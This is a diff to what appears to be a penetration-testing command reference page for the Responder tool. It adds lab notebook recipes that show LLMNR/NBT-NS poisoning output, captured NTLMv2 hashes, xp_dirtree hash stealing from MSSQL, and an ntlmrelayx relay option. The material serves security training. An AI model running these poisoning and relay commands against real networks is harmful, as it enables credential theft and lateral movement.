@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=responder) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -23,8 +25,196 @@ sudo responder -I tun0
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=responder)
+## Notebook recipes
 
-## Learning and original examples
+9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Responder — Interface and Startup](/tools/responder)
+<AccordionGroup>
+
+<Accordion title="Capture MSSQL Service Hash">
+
+### Capture MSSQL Service Hash
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+grcic550@htb[/htb]$ sudo responder -I tun0
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+<SNIP>
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+
+XP_SUBDIRS Hash Stealing with impacket
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo responder -I tun0
+
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+<SNIP>
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+```
+
+</Accordion>
+
+<Accordion title="Forced Authentication Attacks">
+
+### Forced Authentication Attacks
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ responder -I <interface name>
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo responder -I ens33
+
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.198]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-2TY1Z1CIGXH]
+    Responder Domain Name      [HF2L.LOCAL]
+    Responder DCE-RPC Port     [48162]
+
+[+] Listening for events...
+
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
+
+SMB = Off
+```
+
+</Accordion>
+
+<Accordion title="LLMNR/NBT-NS Poisoning - from Linux">
+
+### LLMNR/NBT-NS Poisoning - from Linux
+
+**LLMNR and NBT-NS Poisoning**
+
+```bash
+responder -h
+```
+
+</Accordion>
+
+<Accordion title="When you don&#x27;t have sysadmin: steal the service account&#x27;s hash with xp_dirtree">
+
+### When you don't have sysadmin: steal the service account's hash with xp_dirtree
+
+**Microsoft SQL Server Enumeration**
+
+```bash
+# 1. On your box, listen for the inbound authentication
+sudo responder -I tun0                 # capture the NetNTLM hash to crack offline
+# (or) sudo impacket-ntlmrelayx -t <other-host> -smb2support   # relay it instead of cracking
+```
+
+</Accordion>
+
+<Accordion title="Responder — Interface and Startup">
+
+### Responder — Interface and Startup
+
+**Responder — Interface and Startup**
+
+```bash
+ip -br addr
+responder --help
+```
+
+**Responder — Interface and Startup**
+
+```bash
+sudo responder -I LAB_INTERFACE -A
+```
+
+</Accordion>
+
+</AccordionGroup>
